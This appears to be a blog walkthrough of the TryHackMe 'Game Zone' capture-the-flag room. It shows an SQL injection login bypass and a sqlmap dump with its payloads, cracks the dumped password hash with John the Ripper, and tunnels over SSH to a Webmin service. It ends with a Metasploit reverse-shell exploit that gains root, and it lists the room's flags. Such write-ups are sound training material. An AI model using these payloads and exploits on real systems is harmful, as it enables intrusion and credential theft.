---
layout: post
title: THM — Game Zone
date: 2022-09-29 01:00:00 -500
categories: [TryHackMe]
tags: [SQLi, SQLMap, JohnTheRipper]
---

<img src="/assets/images/GameZone/logo.png" alt="GameZone Logo" width="30%">

***
<center><strong><font color="White">This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.</font></strong></center>

***

## <strong><font color="#34A5DA">Nmap Scan</font></strong>

```console
vladislav@Mac ~ % nmap -sV -sC 10.10.76.150 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-29 18:51 MSK
Nmap scan report for 10.10.76.150
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61ea89f1d4a7dca550f76d89c3af0b03 (RSA)
|   256 b37d72461ed341b66a911516c94aa5fa (ECDSA)
|_  256 536709dcfffb3a3efbfecfd86d4127ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.30 seconds
```

## <strong><font color="#34A5DA">Obtain access via SQLi</font></strong>

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.

Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

```sql
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use ' or 1=1 -- - as your username and leave the password blank.

However, that doesn't work. We can try changing `--` to `#`. That works!

<img src="/assets/images/GameZone/1.png" alt="GameZone Portal" width="50%">

> When you've logged in, what page do you get redirected to? `portal.php`

***

## <strong><font color="#34A5DA">Using SQLMap</font></strong>

<img src="/assets/images/GameZone/SQLMap%20Logo.png" alt="GameZone Portal" width="25%">

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

We're going to use SQLMap to dump the entire database for GameZone.

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using BurpSuite:

```http
POST /portal.php HTTP/1.1
Host: 10.10.76.150
Content-Length: 12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.76.150
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.76.150/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=stf6k27hlldnk3bbi7890ohuo7
Connection: close

searchitem=a
```

Save this request into a text file (`request.txt`). We can then pass this into SQLMap to use our authenticated user session.

Then run the following:
```bash
sqlmap -r request.txt --dbms=mysql --dump
```

Parameters used:
* `-r` — uses the intercepted request we saved earlier
* `--dbms` — tells SQLMap what type of database management system it is
* `--dump` — attemps to outputs the entire database

```console
vladislav@Mac ~ % sqlmap -r request.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.9#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:28:54 /2022-09-29/

[18:28:54] [INFO] parsing HTTP request from 'request.txt'
[18:28:54] [INFO] testing connection to the target URL
[18:28:54] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:28:54] [INFO] testing if the target URL content is stable
[18:28:54] [INFO] target URL content is stable
[18:28:54] [INFO] testing if POST parameter 'searchitem' is dynamic
[18:28:54] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[18:28:54] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[18:28:55] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[18:28:55] [INFO] testing for SQL injection on POST parameter 'searchitem'
y
[18:30:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:30:27] [WARNING] reflective value(s) found and filtering out
[18:30:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:30:28] [INFO] testing 'Generic inline queries'
[18:30:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:30:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:30:33] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="is")
[18:30:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:30:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:30:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:30:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:30:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:30:34] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[18:30:34] [INFO] testing 'MySQL inline queries'
[18:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:30:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:30:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:30:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:30:45] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:30:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:30:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:30:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:30:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:30:45] [INFO] target URL appears to have 3 columns in query
[18:30:46] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[18:30:46] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-6208' OR 5467=5467#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=a' AND GTID_SUBSET(CONCAT(0x71717a6a71,(SELECT (ELT(8617=8617,1))),0x71766b7071),8617)-- EjRl

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=a' AND (SELECT 7610 FROM (SELECT(SLEEP(5)))yuoi)-- kJeA

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=a' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6a71,0x6e59474c4a676d687048576b68674e72575948747041536e424470794d4269596f70684e53774e55,0x71766b7071)#
---
[18:32:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[18:32:05] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:32:05] [INFO] fetching current database
[18:32:05] [INFO] fetching tables for database: 'db'
[18:32:05] [INFO] fetching columns for table 'post' in database 'db'
[18:32:06] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[18:32:06] [INFO] table 'db.post' dumped to CSV file '/Users/vladislav/.local/share/sqlmap/output/10.10.76.150/dump/db/post.csv'
[18:32:06] [INFO] fetching columns for table 'users' in database 'db'
[18:32:06] [INFO] fetching entries for table 'users' in database 'db'
[18:32:06] [INFO] recognized possible password hashes in column 'pwd'
```

We got the dump of table `post`.

After that we get dump of table `users`:

```console
[18:34:29] [WARNING] no clear password(s) found                                
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+


```

> In the users table, what is the hashed password? `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> What was the username associated with the hashed password? `agent47`

> What was the other table name? `post`

***

## <strong><font color="#34A5DA">Cracking a password with JohnTheRipper</font></strong>

<img src="/assets/images/GameZone/JtR.png" alt="JohnTheRipper Logo" width="20%">

John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.

We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there. 

This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.

***

First save the hash as a file (`hash`). Now let's use JohnTheRipper to crack the password hash:

(John will advise formats if we run the below command without `--format=...`)

```bash
john hash --wordlist=share/wordlists/rockyou.txt --format="Raw-SHA256"
```

Parameters:
* `hash` — contains a list of our hashes (however, in our case only 1)
* `--wordlist` — is the wordlist we're using to find the dehashed value
* `--format` — is the hashing algorithm used. In our case its hashed using SHA256.

After cracking we can see the pass:
```console
vladislav@Mac ~ % john hash --show --format="Raw-SHA256"  
?:videogamer124

1 password hash cracked, 0 left
```

> What is the de-hashed password? `videogamer124`

Now, once we have username `agent47` and password `videogamer124`, we can try to SSH into the machine.

```bash
ssh agent47@10.10.76.150
videogamer124
```

> What is the user flag? `649ac17b1480ac13ef1e4fa579dac95c`

***

## <strong><font color="#34A5DA">Exposing services with reverse SSH tunnels</font></strong>

<img src="/assets/images/GameZone/reverse_ssh.png" alt="JohnTheRipper Logo" width="70%">

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

`-L` is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do `ssh -L 9000:imgur.com:80 user@example.com`. Going to `localhost:9000` on your machine, will load imgur traffic using your other server.

`-R` is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

We will use a tool called `ss` to investigate sockets running on a host.

If we run `ss -tulpn` it will tell us what socket connections are running

```console
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q                                                                             Local Address:Port                                                                                            Peer Address:Port              
udp    UNCONN     0      0                                                                                              *:10000                                                                                                      *:*                  
udp    UNCONN     0      0                                                                                              *:68                                                                                                         *:*                  
tcp    LISTEN     0      80                                                                                     127.0.0.1:3306                                                                                                       *:*                  
tcp    LISTEN     0      128                                                                                            *:10000                                                                                                      *:*                  
tcp    LISTEN     0      128                                                                                            *:22                                                                                                         *:*                  
tcp    LISTEN     0      128                                                                                           :::80                                                                                                        :::*                  
tcp    LISTEN     0      128                                                                                           :::22                                                                                                        :::*                  
```

| Argument | Description                        |
|----------|------------------------------------|
| `-t`     | Display TCP sockets                |
| `-u`     | Display UDP sockets                |
| `-l`     | Displays only listening sockets    |
| `-p`     | Shows the process using the socket |
| `-n`     | Doesn't resolve service names      |

> How many TCP sockets are running? `5`

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run 
```bash
ssh -L 10000:localhost:10000 <username>@<ip>
```

Once complete, in your browser type `localhost:10000` and you can access the newly-exposed webserver.

<img src="/assets/images/GameZone/reverse_ssh_site.png" alt="JohnTheRipper Logo" width="100%">

> What is the name of the exposed CMS? `Webmin`

We can log into the exposed CMS with the same credentials.

> What is the CMS version? `1.580`

***

## <strong><font color="#34A5DA">Privilege Escalation with Metasploit</font></strong>

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

***

On [exploit-db.com](https://www.exploit-db.com) we can find an [exploit](https://www.exploit-db.com/exploits/21851).

Msfconsole:
xw
```console
msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS 127.0.0.1
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PAYLOAD payload/cmd/unix/reverse
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST 10.18.7.222
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit

[*] Started reverse TCP double handler on 10.18.7.222:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo KACyihBCsCfJt23r;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "KACyihBCsCfJt23r\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.18.7.222:4444 -> 10.10.76.150:42686) at 2022-09-29 19:31:04 +0300

whoami
root
```

Find the flag:

```bash
cd /root
cat root.txt
```

> What is the root flag? `a4b945830144bdd71908d12d902adeee`